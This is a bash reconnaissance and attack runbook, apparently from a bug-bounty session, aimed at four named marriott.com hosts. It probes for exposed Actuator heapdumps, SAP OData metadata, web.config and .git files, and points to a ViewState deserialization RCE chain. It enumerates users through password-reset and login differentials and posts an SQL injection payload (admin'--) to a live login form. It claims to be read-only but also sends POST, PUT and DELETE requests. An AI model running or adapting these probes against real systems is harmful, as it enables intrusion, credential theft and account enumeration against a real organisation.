#!/usr/bin/env bash
# Session 13 — Four-Target Hunt Runbook
# Targets: gatewaydsapdev2 (M005), esupplier (M001), eidhelp (M010), bpa2 (M012)
# Run: bash PI-RUNBOOK-session13-four-targets.sh 2>&1 | tee /tmp/s13-output.txt
# Date: 2026-06-22
# Rules: max 20 req/s, GET/read-only only, no >10k request fuzzing

OUTDIR="$HOME/bbh/results/marriott/s13"
mkdir -p "$OUTDIR"

probe() {
  local url="$1"
  local result
  result=$(curl -sk -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
    --max-time 10 "$url" 2>/dev/null)
  echo "$result|$url"
}

fetch() {
  local url="$1"
  curl -sk -i --max-time 15 "$url" 2>/dev/null | head -80
}

echo "======================================================================"
echo "SESSION 13 — FOUR-TARGET HUNT"
echo "Date: $(date -u)"
echo "======================================================================"

# ==============================================================================
# TARGET 1: gatewaydsapdev2.marriott.com (M005 — SAP DEV Gateway, CRITICAL)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 1: gatewaydsapdev2.marriott.com (SAP DEV Gateway) ==="
echo "======================================================================"

BASE="https://gatewaydsapdev2.marriott.com"

echo ""
echo "--- 1A. Spring Boot Actuator ---"
for path in /actuator /actuator/health /actuator/env /actuator/info \
            /actuator/beans /actuator/mappings /actuator/heapdump \
            /actuator/logfile /actuator/metrics /actuator/configprops \
            /actuator/trace /actuator/dump /actuator/httptrace; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1B. SAP-Specific Paths ---"
for path in /sap/public/ping /sap/bc/ping /sap/bc/rest/ \
            /sap/opu/odata/ /sap/opu/odata4/ \
            /sap/bc/adt/ /sap/bc/adt/core/locks \
            /sap/hana/xs/ /gateway.svc "/gateway.svc/\$metadata" \
            /sap/opu/odata/SAP/ /sap/opu/odata/sap/ \
            /sap/bc/webdynpro/ /sap/bc/gui/sap/its/webgui; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1C. Swagger / OpenAPI ---"
for path in /swagger-ui.html /swagger-ui/ /swagger-ui/index.html \
            /v2/api-docs /v3/api-docs /openapi.json /openapi.yaml \
            /api-docs /api/swagger.json /swagger.json /api/v1/swagger.json; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1D. Generic Admin/Debug ---"
for path in /admin /console /debug /health /info /status /metrics \
            /config /env /api /api/v1 /api/v2 /management \
            /manager/html /host-manager/html /jmx-console; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1E. Fetch live paths (200/401/403) in full ---"
for path in /sap/public/ping /sap/opu/odata/ /actuator/health /health /info; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
  fi
done

echo ""
echo "--- 1F. OData metadata (key SAP finding) ---"
for path in "/sap/opu/odata/\$metadata" /sap/opu/odata4/sap/ \
            "/odata/\$metadata" "/odata/v2/\$metadata" "/odata/v4/\$metadata"; do
  echo "Probing: ${BASE}${path}"
  curl -sk -i --max-time 10 "${BASE}${path}" | head -30
  echo "---"
done

echo ""
echo "--- 1G. HTTP methods on root ---"
for method in OPTIONS HEAD TRACE PUT DELETE PATCH; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "$method" \
    --max-time 5 "${BASE}/")
  echo "METHOD=$method status=$code"
done

# ==============================================================================
# TARGET 2: esupplier.marriott.com (M001 — Supplier Portal, CRITICAL)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 2: esupplier.marriott.com (Supplier Portal) ==="
echo "======================================================================"

BASE="https://esupplier.marriott.com"

echo ""
echo "--- 2A. Root page analysis ---"
curl -sk -i "${BASE}/" | head -60
echo ""
echo "--- 2A2. Root page content mining + ViewState extraction ---"
curl -sk "${BASE}/" | python3 -c "
import sys, re, base64
html = sys.stdin.read()
forms   = re.findall(r'action=[\"\'](.*?)[\"\'`]', html, re.I)
scripts = re.findall(r'src=[\"\'](.*?\.js[^\"\']*)[\"\'`]', html, re.I)
apis    = re.findall(r'[\"\'](/(?:api|odata|rest|svc)/[^\"\']{2,60})[\"\'`]', html, re.I)
links   = list(set(re.findall(r'href=[\"\'](/[^\"\']{2,60})[\"\'`]', html, re.I)))
print('FORMS:', forms[:10])
print('SCRIPTS:', scripts[:10])
print('API_REFS:', sorted(set(apis))[:20])
print('LINKS:', sorted(set(links))[:25])
print('SIZE:', len(html))
print()
# ViewState analysis — critical for WebForms deserialization
vs = re.findall(r'__VIEWSTATE[^>]*value=[\"\'](.*?)[\"\'`]', html, re.I)
evs = re.findall(r'__EVENTVALIDATION[^>]*value=[\"\'](.*?)[\"\'`]', html, re.I)
if vs:
    print(f'VIEWSTATE_FOUND: yes (length={len(vs[0])})')
    # Check if starts with 0x FF 0x 01 (BinaryFormatter) vs /w (JSON-based)
    try:
        decoded = base64.b64decode(vs[0][:64] + '==')
        hex_start = decoded[:4].hex()
        print(f'VIEWSTATE_HEX_START: {hex_start}')
        if hex_start.startswith('ff01'):
            print('VIEWSTATE_FORMAT: BinaryFormatter — MAC check is critical (ff01=LosFormatter)')
        elif decoded[:2] == b'\\xff\\xd7':
            print('VIEWSTATE_FORMAT: Encrypted ViewState (ff d7 = EncryptedViewState)')
        else:
            print(f'VIEWSTATE_FORMAT: Unknown — raw start: {decoded[:8]}')
    except Exception as e:
        print(f'VIEWSTATE_DECODE_ERR: {e}')
    # MAC check: if value ends with HMAC (32 hex bytes), it is protected
    print(f'VIEWSTATE_SAMPLE: {vs[0][:80]}...')
else:
    print('VIEWSTATE_FOUND: no — not a WebForms page (or JS-rendered)')
if evs:
    print(f'EVENTVALIDATION_FOUND: yes (length={len(evs[0])})')
"

echo ""
echo "--- 2B. ASP.NET / IIS specific + backup files ---"
for path in /elmah.axd /trace.axd /WebResource.axd /Glimpse.axd \
            /web.config /web.config.bak /Web.config.bak /Web.config \
            /web.config.old /web.config~ /web.config.orig \
            /.git/HEAD /.git/config /.git/COMMIT_EDITMSG \
            /app_offline.htm /packages.config /global.asax /Global.asax \
            /App_Data/ /bin/ /obj/ /backup/ /old/ \
            /web.config.txt /connectionstrings.config \
            /appsettings.json /appsettings.Development.json; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2B2. Fetch any exposed config/backup files ---"
for path in /web.config.bak /web.config.old /.git/HEAD \
            /appsettings.json /connectionstrings.config; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${BASE}${path}")
  if [ "$code" = "200" ]; then
    echo "=== CRITICAL: ${BASE}${path} returned HTTP 200 ==="
    fetch "${BASE}${path}"
    echo "*** ACTION: If MachineKey found → ViewState deserialization RCE chain ***"
  fi
done

echo ""
echo "--- 2C. API endpoints ---"
for path in /api/ /api/v1/ /api/v1/suppliers /api/v1/invoices \
            /api/v1/orders /api/v1/users /api/v1/contracts \
            /api/v1/purchase-orders /api/v2/ /odata/ "/odata/\$metadata" \
            /services/ /rest/ /webapi/; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2D. Auth / admin paths ---"
for path in /login /Login /Account/Login /signin /auth /admin \
            /Admin /management /dashboard /Dashboard \
            /Default.aspx /Login.aspx /Home.aspx /Supplier.aspx; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2E. Fetch any live non-redirect paths ---"
for path in /api/ /api/v1/ /api/v1/suppliers /odata/ /elmah.axd \
            /trace.axd /.git/HEAD /web.config; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
  fi
done

echo ""
echo "--- 2F. NTLM/Windows auth probe ---"
curl -sk -I "${BASE}/" | grep -i "www-authenticate\|negotiate\|ntlm\|realm" || echo "no auth header"
curl -sk --ntlm -u ":" "${BASE}/" -I | head -20

echo ""
echo "--- 2G. IDOR test on any numeric ID endpoint found ---"
# If /api/v1/suppliers/1 is live, test 2 and 3
for id in 1 2 3 100 999; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${BASE}/api/v1/suppliers/${id}")
  echo "suppliers/$id → HTTP $code"
done

echo ""
echo "--- 2H. .git source code exposure (if /.git/HEAD = 200) ---"
git_head=$(curl -sk --max-time 8 "${BASE}/.git/HEAD")
if echo "$git_head" | grep -q "ref:"; then
  echo "=== CRITICAL: .git/HEAD exposed: $git_head ==="
  echo "=== Downloading git objects for source code recovery ==="
  curl -sk "${BASE}/.git/config" | head -30
  curl -sk "${BASE}/.git/COMMIT_EDITMSG" | head -10
  echo "*** To recover full source: use gitdumper.py or git-dumper from Pi ***"
  echo "*** Command: git-dumper https://esupplier.marriott.com/.git ./esupplier-source ***"
else
  echo ".git/HEAD: not exposed (response: ${git_head:0:80})"
fi

echo ""
echo "--- 2I. ViewState MAC bypass check (if ViewState found in 2A2) ---"
echo "If VIEWSTATE_FOUND=yes from 2A2 AND no MAC suffix visible:"
echo "Test sending request with tampered __VIEWSTATE to /Login.aspx:"
echo "  Tamper: flip last byte of base64 ViewState value"
echo "  If server returns 200 (not MAC validation error) → enableViewStateMac=false → deserialization possible"
echo "This test is manual — do NOT automate payload sending, GET analysis only for now."

# ==============================================================================
# TARGET 3: eidhelp.marriott.com (M010 — Employee Identity, HIGH)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 3: eidhelp.marriott.com (Employee Identity Help) ==="
echo "======================================================================"

BASE="https://eidhelp.marriott.com"

echo ""
echo "--- 3A. Root page + CNAME chain verify ---"
# Confirmed: eidhelp.marriott.com → eid-help.mi-mgs.com → CloudFront
# HTTP 200 / 7767B with NO auth gate (unlike efast which returns 401)
curl -sk -i "${BASE}/" | head -60
echo ""
echo "--- 3A2. Content mining + JS bundle discovery ---"
curl -sk "${BASE}/" | python3 -c "
import sys, re
html = sys.stdin.read()
inputs   = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
apis     = re.findall(r'[\"\'](/(?:api|rest|svc|service)/[^\"\']{2,60})[\"\'`]', html, re.I)
scripts  = re.findall(r'src=[\"\'](.*?\.js[^\"\']*)[\"\'`]', html, re.I)
links    = list(set(re.findall(r'href=[\"\'](/[^\"\']{2,80})[\"\'`]', html, re.I)))
print('FORM_INPUTS:', inputs[:15])
print('API_REFS:', sorted(set(apis))[:15])
print('JS_BUNDLES:', scripts[:8])
print('LINKS:', sorted(links)[:20])
print('SIZE:', len(html))
" 2>/dev/null

echo ""
echo "--- 3A3. JS bundle mining (critical — API routes hide here) ---"
# Extract all <script src> from root page and mine each bundle
BUNDLE_URLS=$(curl -sk "${BASE}/" | grep -oP 'src="([^"]+\.js[^"]*)"' | sed 's/src="//;s/"//')
if [ -n "$BUNDLE_URLS" ]; then
  echo "Found JS bundles:"
  echo "$BUNDLE_URLS"
  for burl in $BUNDLE_URLS; do
    # Handle relative vs absolute URLs
    if [[ "$burl" =~ ^/ ]]; then
      full_url="${BASE}${burl}"
    else
      full_url="$burl"
    fi
    echo ""
    echo "=== Mining: $full_url ==="
    curl -sk --max-time 20 "$full_url" | python3 -c "
import sys, re
bundle = sys.stdin.read()
# Extract API routes
routes = re.findall(r'[\"'\'']\s*(/(?:api|v\d|rest|svc|service|employee|eid|lookup|reset|user)[^\"'\''\\s]{1,80})[\"'\'']', bundle)
fetch_urls = re.findall(r'fetch\([\"'\''](/[^\"'\'']+)[\"'\'']', bundle)
axios_urls = re.findall(r'axios\.[a-z]+\([\"'\''](/[^\"'\'']+)[\"'\'']', bundle)
all_routes = sorted(set(routes + fetch_urls + axios_urls))
print(f'Bundle size: {len(bundle)}B')
print(f'API routes found: {len(all_routes)}')
for r in all_routes[:40]:
    print(f'  {r}')
" 2>/dev/null
  done
else
  echo "No JS bundles found in root page — may be SPA with inline script or CDN-hosted"
fi

echo ""
echo "--- 3B. Path probe ---"
for path in /api/ /api/v1/ /api/v1/users /api/v1/employees /api/v1/lookup \
            /reset /reset-password /forgot-password /unlock \
            /help /admin /health /status /info /robots.txt \
            /api/employee /api/eid /lookup /identify \
            /api/v1/reset /api/v1/verify /api/v1/validate; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 3C. User enumeration test on any reset/lookup endpoint ---"
# Test email-based lookup: different response = user enum
for email in "test@marriott.com" "invalid-zzz999@marriott.com" "admin@marriott.com"; do
  code=$(curl -sk -o /tmp/eid_resp_$$.txt -w "%{http_code}" \
    "${BASE}/forgot-password?email=${email}" --max-time 8 2>/dev/null)
  size=$(wc -c < /tmp/eid_resp_$$.txt 2>/dev/null || echo 0)
  echo "email=$email → HTTP $code / ${size}B"
  rm -f /tmp/eid_resp_$$.txt
done

echo ""
echo "--- 3D. POST to any reset endpoint ---"
for path in /reset /reset-password /forgot-password /api/v1/reset; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=test@marriott.com" \
    "${BASE}${path}" --max-time 8)
  echo "POST $path → HTTP $code"
done

# ==============================================================================
# TARGET 4: bpa2.marriott.com (M012 — BPA2 Portal, HIGH)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 4: bpa2.marriott.com (BPA2 Portal) ==="
echo "======================================================================"

BASE="https://bpa2.marriott.com"

echo ""
echo "--- 4A. Follow redirect chain ---"
curl -skL -i --max-time 15 "${BASE}/" | head -80

echo ""
echo "--- 4B. Login page analysis ---"
curl -sk -i "${BASE}/Login/Login" | head -60
echo ""
curl -sk "${BASE}/Login/Login" | python3 -c "
import sys, re
html = sys.stdin.read()
inputs  = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
forms   = re.findall(r'action=[\"\'](.*?)[\"\'`]', html, re.I)
hidden  = re.findall(r'type=[\"\'`]?hidden[\"\'`]?[^>]*name=[\"\'](.*?)[\"\'`]', html, re.I)
print('FORM_INPUTS:', inputs[:15])
print('FORM_ACTIONS:', forms[:5])
print('HIDDEN_FIELDS:', hidden[:10])
print('SIZE:', len(html))
" 2>/dev/null

echo ""
echo "--- 4C. Pre-auth path probe (ASP.NET MVC — elmah.axd is highest priority) ---"
for path in /robots.txt /sitemap.xml /elmah.axd /web.config /web.config.bak \
            /api/ /api/v1/ /api/v1/values /health /status \
            /swagger /swagger/ui/index /v2/api-docs /v3/api-docs \
            /.git/HEAD /App_Data/ /Scripts/ /Content/ \
            /Admin/ /admin/ /Management/ /Account/ /Register/ \
            /trace.axd /WebResource.axd; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 4D. Fetch live pre-auth paths (200/401/403) ---"
for path in /robots.txt /sitemap.xml /elmah.axd /swagger \
            /api/ /api/v1/ /health /.git/HEAD /web.config; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
    if [ "$path" = "/elmah.axd" ] && [ "$code" = "200" ]; then
      echo "*** CRITICAL: ELMAH error log exposed — extract error details ***"
    fi
  fi
done

echo ""
echo "--- 4E. Extract CSRF token then run login differential + SQLi ---"
# ASP.NET MVC uses __RequestVerificationToken — must extract before POST
COOKIE_JAR="/tmp/bpa2_cookies_$$.txt"
TOKEN_PAGE=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" 2>/dev/null)
CSRF_TOKEN=$(echo "$TOKEN_PAGE" | python3 -c "
import sys, re
html = sys.stdin.read()
# Try input hidden field
m = re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"', html)
if not m:
    m = re.search(r'value=\"([^\"]+)\"[^>]*name=\"__RequestVerificationToken\"', html)
print(m.group(1) if m else 'NOT_FOUND')
" 2>/dev/null)
echo "CSRF_TOKEN: ${CSRF_TOKEN:0:40}..."
echo "Login page size: $(echo "$TOKEN_PAGE" | wc -c)B"

if [ "$CSRF_TOKEN" != "NOT_FOUND" ] && [ -n "$CSRF_TOKEN" ]; then
  CSRF_PARAM="__RequestVerificationToken=${CSRF_TOKEN}&"
else
  CSRF_PARAM=""
  echo "No CSRF token found — posting without it"
fi

# Test 1: known-format username (valid format)
r1=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -o /tmp/bpa2_r1_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "${CSRF_PARAM}Username=admin&Password=WrongPass123" \
  "${BASE}/Login/Login" --max-time 10)
s1=$(wc -c < /tmp/bpa2_r1_$$.txt 2>/dev/null || echo 0)

# Test 2: nonexistent format username
CSRF_TOKEN2=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" | \
  python3 -c "import sys,re; m=re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"',sys.stdin.read()); print(m.group(1) if m else '')" 2>/dev/null)
r2=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  -o /tmp/bpa2_r2_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__RequestVerificationToken=${CSRF_TOKEN2}&Username=zzz_nonexistent_9x9@nowhere.invalid&Password=WrongPass123" \
  "${BASE}/Login/Login" --max-time 10)
s2=$(wc -c < /tmp/bpa2_r2_$$.txt 2>/dev/null || echo 0)

echo "Login(admin/wrong):           HTTP $r1 / ${s1}B"
echo "Login(nonexistent@x/wrong):   HTTP $r2 / ${s2}B"
if [ "$s1" != "$s2" ] || [ "$r1" != "$r2" ]; then
  echo "*** USER ENUM DIFFERENTIAL DETECTED ***"
  echo "=== Response 1 tail (admin): ==="; tail -5 /tmp/bpa2_r1_$$.txt
  echo "=== Response 2 tail (nonexistent): ==="; tail -5 /tmp/bpa2_r2_$$.txt
fi
rm -f /tmp/bpa2_r1_$$.txt /tmp/bpa2_r2_$$.txt

echo ""
echo "--- 4F. SQLi probe on login (safe boolean-based, fresh token each time) ---"
CSRF_TOKEN3=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" | \
  python3 -c "import sys,re; m=re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"',sys.stdin.read()); print(m.group(1) if m else '')" 2>/dev/null)
r3=$(curl -sk -b "$COOKIE_JAR" \
  -o /tmp/bpa2_sqli_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__RequestVerificationToken=${CSRF_TOKEN3}&Username=admin'--&Password=x" \
  "${BASE}/Login/Login" --max-time 10)
s3=$(wc -c < /tmp/bpa2_sqli_$$.txt 2>/dev/null || echo 0)
echo "Login(admin'--/x): HTTP $r3 / ${s3}B"
if [ "$r3" = "500" ]; then
  echo "*** CRITICAL: HTTP 500 on SQL quote injection — SQLi candidate ***"
  head -40 /tmp/bpa2_sqli_$$.txt
elif [ "$r3" = "200" ] && [ "$s3" -gt 500 ]; then
  echo "*** POSSIBLE SQLi: 200 with large body on injected input ***"
  head -20 /tmp/bpa2_sqli_$$.txt
fi
rm -f /tmp/bpa2_sqli_$$.txt "$COOKIE_JAR"

echo ""
echo "======================================================================"
echo "=== SESSION 13 COMPLETE: $(date -u) ==="
echo "=== Output: /tmp/s13-output.txt ==="
echo "======================================================================"
echo ""
echo "=== TRIAGE GUIDE ==="
echo "HIGH VALUE SIGNALS TO REPORT:"
echo "  - Any 200 on /actuator/env, /actuator/heapdump, /sap/opu/odata/ → CRITICAL"
echo "  - Any /api/v1/suppliers returning data unauthenticated → HIGH IDOR"
echo "  - Login response size differential → user enumeration"
echo "  - SQLi: HTTP 500 on admin'-- or 200 with auth success → Critical"
echo "  - /.git/HEAD returning 200 → source code exposure"
echo "  - Any OData \$metadata 200 → SAP schema exposure"
echo ""
echo "COPY /tmp/s13-output.txt AND PASTE OUTPUT BACK"
